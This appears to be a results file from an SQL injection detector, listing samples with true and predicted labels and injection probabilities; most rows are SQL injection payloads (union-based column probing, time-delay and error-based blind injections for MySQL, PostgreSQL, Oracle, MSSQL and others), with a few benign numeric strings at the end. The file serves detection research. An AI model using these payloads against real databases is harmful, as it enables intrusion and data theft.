text,source,true_label,pred_label,prob_sqli,correct
"1' in boolean mode )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999628067016602,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( 1491 = 1491",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999656677246094,1
"1 )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 7182 = 7182",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999662637710571,1
"1'+ ( select mumb where 4658 = 4658 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"1 )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 3343 = 3343",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999606609344482,1
"select pg_sleep ( 5 )  and  ( ""tpry"" = ""tpry",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999622106552124,1
"1%""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999963641166687,1
"-4329' )  union all select 1353,1353,1353,1353,1353,1353#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"1"" )  where 4913 = 4913",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999610185623169,1
"1""  )  )   )  waitfor delay '0:0:5' and   (  (   ( ""ckht"" = ""ckht",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"1'|| ( select 'flre' where 8250 = 8250 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   ) ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
-9434' )  union all select 3106#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
"1'+ ( select sged where 1181 = 1181 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
1 where 8135 = 8135,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999570846557617,1
1  )  )   as qlkf where 6635 = 6635,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
1  )  )   as myxo where 1759 = 1759 union all select null#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"-5054%""  )  )   )  union all select 8263,8263,8263,8263--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'fwok' like 'fwok",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999605417251587,1
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'vunt' = 'vunt",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999634027481079,1
"-8065""  )  )   )  order by 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.99996018409729,1
"1%""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999607801437378,1
"1  )  )   as jzzo where 7773 = 7773 union all select null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999619722366333,1
"1 )  where 3738 = 3738 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"select * from generate_series ( 6414,6414,case when  ( 6414 = 6455 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999603033065796,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( 'vcgc' like 'vcgc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999608993530273,1
"1"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
select sleep ( 5 )  and 'mlmu' = 'mlmu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999585151672363,1
1'+ ( select 'yyyn' where 5395 = 5395,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999604225158691,1
"-9263' )  as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999656677246094,1
"1"" )  union all select null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999608993530273,1
"1' )  union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999599456787109,1
"-4407"" )  where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
"1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'stqq' = 'stqq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999657869338989,1
"1  )  )   as vycb where 3524 = 3524 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999629259109497,1
1%'  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
"1' )  where 5071 = 5071 union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999606609344482,1
"1' and elt ( 4249 = 4249,7259 )  and 'awjd' = 'awjd",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"1'  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  'zknl' = 'zknl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999656677246094,1
select  ( case when  ( 3773 = 3722 )  then 3773 else 3773* ( select 3773 from mysql.db )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962329864502,1
"iif ( 1483 = 7301,1,1/0 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999579191207886,1
"1"" )  as kuuf where 6908 = 6908",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"-2838"" where 5442 = 5442 union all select 5442#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999631643295288,1
"1' where 6905 = 6905 union all select null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999619722366333,1
"-4615'  )  )   )  or elt ( 1032 = 1032,3623 )  and   (  (   ( 'jipk' like 'jipk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999653100967407,1
1 and sleep ( 5 ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999468326568604,1
1' where 1692 = 1692,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999600648880005,1
"1, ( select  ( case when  ( 5141 = 5141 )  then  ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )   )  else 5141/ ( select 0 from  ( values ( 0  )  )   )  end )  from  ( values ( 0  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999641180038452,1
"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999635219573975,1
"-5160' )  union all select 8067,8067,8067,8067,8067,8067,8067--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999634027481079,1
-3867%' )  or 3084 = 5633 and  ( '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"1%' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"1' )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
1'|| ( select 'ghby' from dual where 4854 = 4854,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999583959579468,1
"1' in boolean mode )  and elt ( 9630 = 4765,4765 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"1"" )  as xaye where 5343 = 5343 and 4355 = 7475#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999651908874512,1
"1"" )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999630451202393,1
"-2784'  )  )   union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
1' )  as dpmh where 5281 = 5281 and 2006 = 2006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999634027481079,1
1'+ ( select 'jkgf' where 7487 = 7487,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999614953994751,1
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"1%""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
"-1162""  )  )   as mhmh where 8710 = 8710 or make_set ( 4822 = 7598,7598 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999641180038452,1
"1"" )  and make_set ( 8403 = 8403,8899 )  and  ( ""dhss"" = ""dhss",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962329864502,1
"-7963'+ ( select 'kxzh' where 7039 = 7039 union all select 7039,7039,7039,7039,7039,7039--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999632835388184,1
1' )  where 6440 = 6440 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999642372131348,1
"1""  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""qgle"" like ""qgle",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999655485153198,1
"select sleep ( 5 )  and   (  (   ( ""zlal"" = ""zlal",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"1'|| ( select 'drna' from dual where 5082 = 5082 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999651908874512,1
1' )  where 3730 = 3730 and sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999620914459229,1
"-8919"" or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""nstr"" = ""nstr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"1' )  as mmhe where 2142 = 2142 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
"1%""  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999605417251587,1
"1 )  where 5234 = 5234 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999655485153198,1
"1'  )  )   union all select null,null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999613761901855,1
"1 )  where 9829 = 9829 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
"1%' )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999654293060303,1
"1%'  )  )   or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999634027481079,1
"-2605"" )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""cikb"" like ""cikb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999659061431885,1
"1' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
"waitfor delay '0:0:5' and  ( ""dmcu"" = ""dmcu",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999618530273438,1
"-9031%"" )  order by 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999593496322632,1
"1, ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"-1525'  )  )   )  union all select 4110,4110,4110,4110,4110,4110#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999649524688721,1
"1' )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
1 )  where 4711 = 4711,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999608993530273,1
"1 )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999962568283081,1
"-6236'  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
"-4236' )  union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999641180038452,1
-4219' or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
"1"" where 4319 = 4319",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999573230743408,1
-7041' )  where 6307 = 6307 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999630451202393,1
"1""  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""wute"" like ""wute",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999650716781616,1
"1'  )  )   or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"1' or elt ( 6272 = 6272,sleep ( 5  )  )   and 'wdoi' = 'wdoi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
1'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'ykjs' like 'ykjs,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999657869338989,1
"-4550"" )  as hlwe where 6026 = 6026 or  ( 9364 = 9593 ) *9593--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999645948410034,1
"1  )  )   as cdhd where 2958 = 2958 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999644756317139,1
1'  )  )   )  and 2542 = 7042--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999964714050293,1
"-4373%""  )  )   or 5672 = 5188--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
1' rlike sleep ( 5 )  and 'ojqz' like 'ojqz,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999639987945557,1
1' )  where 1917 = 1917 union all select null#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999624490737915,1
"1'+ ( select pdfv where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999662637710571,1
end ) +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999358654022217,1
"1' )  as idqc where 5288 = 5288 and elt ( 1210 = 1210,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999637603759766,1
1 where 4985 = 4985 order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999560117721558,1
"-6363"" )  where 4043 = 4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999619722366333,1
"-1504"" )  as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999628067016602,1
"1 where 6040 = 6040 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999614953994751,1
1 )  as zmxb where 8424 = 8424 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999654293060303,1
"1""  )  )   as hace where 8785 = 8785",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999626874923706,1
5838987688567542,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.229432230815291e-05,1
9842153778086197,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,6.78482319926843e-05,1
8851191771150286,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.283460581675172e-05,1
4138413338105604,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.104141695890576e-05,1
08349,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,0.0001328436628682539,1
6718614214297094,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,6.827061588410288e-05,1
5255016250924292,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.86080160853453e-05,1
4617331244727589,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.839078170945868e-05,1
5955499779082476,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.879534678068012e-05,1
6659103638292546,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.331242522923276e-05,1
6187378791844475,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.202915341826156e-05,1
3192907631401763,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.279427129309624e-05,1
5220241028812840,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.667618385516107e-05,1
1944184387366520,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.944064029492438e-05,1
3245452183569196,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,8.967480971477926e-05,1
